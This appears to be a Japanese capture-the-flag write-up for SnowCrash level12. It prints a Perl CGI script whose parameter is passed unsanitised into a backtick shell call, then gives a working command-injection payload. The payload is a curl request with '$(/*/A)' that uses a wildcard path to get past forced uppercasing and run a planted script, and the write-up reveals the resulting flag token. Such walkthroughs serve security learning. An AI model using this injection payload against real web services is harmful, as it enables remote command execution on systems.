## perlスクリプトの内容を確認
```sh
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//; # 空白以降の文字列削除
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}
```

## エクスプロイト
`curl 'http://localhost:4646/?x=` にリクエストを送信し`@output = egrep "^$xx" /tmp/xd 2>&1;`で任意のコマンドをインジェクションできる。
ただし、ファイル作成できるディレクトリが`/tmp/`のみで`$xx =~ tr/a-z/A-Z/;` でアッパーケースになり、`/tmp/`のファイルをそのまま読み込ませることはできない。
この問題を回避するために、ワイルドカード`/*/`を使う。

### インジェクション用のスクリプト作成
```sh
level12@SnowCrash:~$ echo '#!/bin/bash' > /tmp/A
level12@SnowCrash:~$ echo 'getflag > /tmp/a' >> /tmp/A
level12@SnowCrash:~$ chmod +x /tmp/A
```

### 実行
```sh
level12@SnowCrash:~$ curl 'http://localhost:4646/?x=$(/*/A)'
..level12@SnowCrash:~$cat /tmp/a
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```